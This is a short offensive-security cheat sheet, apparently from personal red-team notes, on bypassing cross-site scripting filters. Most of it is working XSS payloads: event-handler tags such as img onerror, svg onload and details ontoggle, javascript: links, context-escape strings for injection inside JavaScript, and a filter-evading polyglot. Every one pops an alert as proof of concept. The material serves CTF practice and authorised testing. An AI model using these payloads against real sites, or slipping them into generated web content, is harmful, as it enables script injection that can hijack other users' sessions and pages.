# XSS Filters Bypass

*To bypass advanced filtering: [HTML Payloads Tricks](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#html) and [JavaScript payloads Tricks](/cybersecurity/red-team/s3.exploitation/vulns/cheatsheet/payloads.md#javascript).*

<div class="row row-cols-lg-2"><div>

PortSwigger has an awesome list of HTML tags and HTML attributes allowing you to easily find [XSS payloads](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

1. FUZZ and find allowed tags
2. Select a tag in the list that you can use
3. Either test a few payloads, or FUZZ again

You may also use [xss-payload-list](https://github.com/payloadbox/xss-payload-list) <small>(6.8k ‚≠ê)</small>. Below are some of my favorites. They may not require user interaction <small>(e.g. auto)</small>, optionally according to the target <small>(e.g. auto|manual)</small>, or always <small>(e.g. manual)</small>.

* Tags: `a#href`, `iframe#src`, `object#data`, `embed#src`

```html!
<a href="javascript:alert(1)">x</a>      <!-- auto -->
```

* Tags: `DETAILS`

```html!
<details open ontoggle=alert(1)></details> <!-- auto -->
```
</div><div>

* Tags: `*`

```html!
<a id=x tabindex=1 onfocus=alert(1)></a> <!-- auto|manual -->
```

* Tags: `INPUT`, `SELECT`, `BUTTON`, `KEYGEN`, etc.

```html!
<input autofocus onfocus="alert(1)">     <!-- auto -->
```

* Tags: `IMG`, `LINK`, `INPUT`, `BODY`, `SOURCE`, etc.

```html!
<img src=1 onerror="alert(1)">           <!-- auto -->
```

* Others

```html!
<svg onload=alert(1)>
<svg><animatetransform onbegin=alert(1)>
```
</div></div>

<hr class="sep-both">

## Context Escape

<div class="row row-cols-lg-2"><div>

In multiple CTFs, the input is reflected in a specific context.

#### Context Escape ‚Äî JavaScript

[![cross_site_scripting](../../../../../_badges/htb/cross_site_scripting.svg)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)
[![xssgi](../../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)
[![mystery](../../../../../_badges/ps-lab/mystery.svg)](https://portswigger.net/web-security/all-topics)

A common case is from within JavaScript code:

```javascript
let xxx = 'here'
xxx.innerHTML = 'here'
```

Common payloads or examples:

* `';alert(1);//`
* `''-alert(1)-''` 
* `''+alert(1)+''` 
* `''&alert(1)&''`
* `"};alert(1)//`

See also: [JavaScript eval function](/cybersecurity/red-team/s3.exploitation/vulns/injection/eval.md).
</div><div>
</div></div>

<hr class="sep-both">

## üëª To-do üëª

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

#### XSS Polygots Filtering Bypass

[![xssgi](../../../../../_badges/thmp/xssgi.svg)](https://tryhackme.com/room/xssgi)
[![xss](../../../../../_badges/thmp/xss.svg)](https://tryhackme.com/room/xss)

Polygot are complex payloads designed to bypass many filter:

```js!
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```
</div><div>
</div></div>